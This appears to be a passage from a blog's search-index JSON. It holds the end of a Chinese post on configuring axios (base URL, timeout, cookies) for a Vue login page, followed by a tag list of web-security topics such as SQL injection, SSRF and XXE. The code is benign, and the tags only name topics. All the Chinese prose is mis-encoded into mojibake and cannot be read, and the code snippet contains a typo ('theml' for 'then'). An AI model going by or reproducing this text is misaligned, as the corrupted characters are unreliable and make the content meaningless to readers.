è€¦åˆæ€§ï¼Œåº”è¯¥æŠ“é—¨å»ºç«‹ä¸€ä¸ªaxiosæ–‡ä»¶å¤¹ï¼Œå¹¶ä¸”è®¾ç½®ä¸€ä¸ªhttp.jsï¼Œå„ç§å„æ ·çš„è®¾ç½®æˆ‘ä»¬éƒ½åœ¨axioså½“ä¸­è¿›è¡Œé…ç½®å³å¯ï¼š 12345import axios from &#x27;axios&#x27;axios.defaults.baseURL = &#x27;http://localhost:8081&#x27;;axios.defaults.timeout = 1000000;axios.defaults.withCredentials = true ä¾‹å¦‚è¿™æ ·ï¼Œå°±æ˜¯è®¾ç½®äº†é»˜è®¤çš„urlï¼Œè®¾ç½®è¶…æ—¶äº‹ä»¶ï¼Œå¸¦ä¸Šcookiesç­‰ç­‰ï¼Œè€Œaxiosçš„ä½¿ç”¨ä¹Ÿå¾ˆç®€å•ï¼Œæ„é€ å¦‚ä¸‹ï¼š 12345678910111213axios.post(&quot;/login&quot;,formData,config).then(res =&gt; &#123; if(res.data == 0 )&#123; alert(&quot;è´¦å·æˆ–å¯†ç é”™è¯¯ï¼&quot;) &#125; else&#123; this.$message.success(` login successfully!`); router.push(&#123; path:&quot;/upload&quot; &#125;) &#125; &#125;).catch(err =&gt; &#123; console.log(err) &#125;); axios.get/post axios.get().theml().catch() åœ¨thenå’Œcatå½“ä¸­å»å†™åˆ«çš„ä¸œè¥¿ï¼Œä¸Šå›¾å½“ä¸­çš„res.dataä¸ºAPIç»™å›æ¥çš„æ•°æ®ï¼ŒæˆåŠŸä¹‹årouter.pushå°±å¯ä»¥è®©é¡µé¢è¿›è¡Œè·³è½¬äº† æ€»ç»“æ„Ÿè§‰è‡ªå·±æ˜¯è¾¹å­¦è¾¹å†™çš„ï¼Œå­¦åˆ°åé¢çš„æ—¶å€™æ„Ÿè§‰ä¹‹å‰çš„ä¸œè¥¿è¿˜å¯ä»¥åšå¾—æ›´å¥½ï¼Œä½†æ˜¯è“ç‹—äº†ï¼Œå·²ç»ä¸æƒ³åŠ¨äº†orz","categories":[],"tags":[{"name":"å¼€å‘","slug":"å¼€å‘","permalink":"http://example.com/tags/%E5%BC%80%E5%8F%91/"}]}],"categories":[],"tags":[{"name":"PHP","slug":"PHP","permalink":"http://example.com/tags/PHP/"},{"name":"ååºåˆ—åŒ–","slug":"ååºåˆ—åŒ–","permalink":"http://example.com/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"},{"name":"Python","slug":"Python","permalink":"http://example.com/tags/Python/"},{"name":"Flask","slug":"Flask","permalink":"http://example.com/tags/Flask/"},{"name":"Linux","slug":"Linux","permalink":"http://example.com/tags/Linux/"},{"name":"Node","slug":"Node","permalink":"http://example.com/tags/Node/"},{"name":"åŸå‹é“¾æ±¡æŸ“","slug":"åŸå‹é“¾æ±¡æŸ“","permalink":"http://example.com/tags/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/"},{"name":"JavaScript","slug":"JavaScript","permalink":"http://example.com/tags/JavaScript/"},{"name":"æ–‡ä»¶ä¸Šä¼ ","slug":"æ–‡ä»¶ä¸Šä¼ ","permalink":"http://example.com/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"},{"name":"PHP.INI","slug":"PHP-INI","permalink":"http://example.com/tags/PHP-INI/"},{"name":"å‘½ä»¤æ‰§è¡Œ","slug":"å‘½ä»¤æ‰§è¡Œ","permalink":"http://example.com/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"},{"name":"PHPç‰¹æ€§","slug":"PHPç‰¹æ€§","permalink":"http://example.com/tags/PHP%E7%89%B9%E6%80%A7/"},{"name":"Laravel","slug":"Laravel","permalink":"http://example.com/tags/Laravel/"},{"name":"Apache","slug":"Apache","permalink":"http://example.com/tags/Apache/"},{"name":"ä»£ç å®¡è®¡","slug":"ä»£ç å®¡è®¡","permalink":"http://example.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"},{"name":"php","slug":"php","permalink":"http://example.com/tags/php/"},{"name":"JSON","slug":"JSON","permalink":"http://example.com/tags/JSON/"},{"name":"SSRF","slug":"SSRF","permalink":"http://example.com/tags/SSRF/"},{"name":"NodeJs","slug":"NodeJs","permalink":"http://example.com/tags/NodeJs/"},{"name":"[object Object]","slug":"object-Object","permalink":"http://example.com/tags/object-Object/"},{"name":"SQL","slug":"SQL","permalink":"http://example.com/tags/SQL/"},{"name":"CVE","slug":"CVE","permalink":"http://example.com/tags/CVE/"},{"name":"ThinkPHP","slug":"ThinkPHP","permalink":"http://example.com/tags/ThinkPHP/"},{"name":"Java","slug":"Java","permalink":"http://example.com/tags/Java/"},{"name":"FastJson","slug":"FastJson","permalink":"http://example.com/tags/FastJson/"},{"name":"java","slug":"java","permalink":"http://example.com/tags/java/"},{"name":"sqlæ³¨å…¥","slug":"sqlæ³¨å…¥","permalink":"http://example.com/tags/sql%E6%B3%A8%E5%85%A5/"},{"name":"Tomcat","slug":"Tomcat","permalink":"http://example.com/tags/Tomcat/"},{"name":"nodejs","slug":"nodejs","permalink":"http://example.com/tags/nodejs/"},{"name":"BUU","slug":"BUU","permalink":"http://example.com/tags/BUU/"},{"name":"Javascirpt","slug":"Javascirpt","permalink":"http://example.com/tags/Javascirpt/"},{"name":"vm2æ²™ç®±é€ƒé€¸","slug":"vm2æ²™ç®±é€ƒé€¸","permalink":"http://example.com/tags/vm2%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/"},{"name":"XXE","slug":"XXE","permalink":"http://example.com/tags/XXE/"},{"name":"AWD","slug":"AWD","permalink":"http://example.com/tags/AWD/"},{"name":"å¼€å‘","slug":"å¼€å‘","permalink":"http://example.com/tags/%E5%BC%80%E5%8F%91/"},{"name":"SQLæ³¨å…¥","slug":"SQLæ³¨å…¥","permalink":"http://example.com/tags/SQL%E6%B3%A8%E5%85%A5/"},{"name":"æ¸—é€","slug":"æ¸—é€","permalink":"http://example.com/tags/%E6%B8%97%E9%80%8F/"},{"name":"æ¯”èµ›","slug":"æ¯”èµ›","permalink":"http://example.com/tags/%E6%AF%94%E8%B5%9B/"},{"name":"ssti","slug":"ssti","permalink":"http://example.com/tags/ssti/"}]}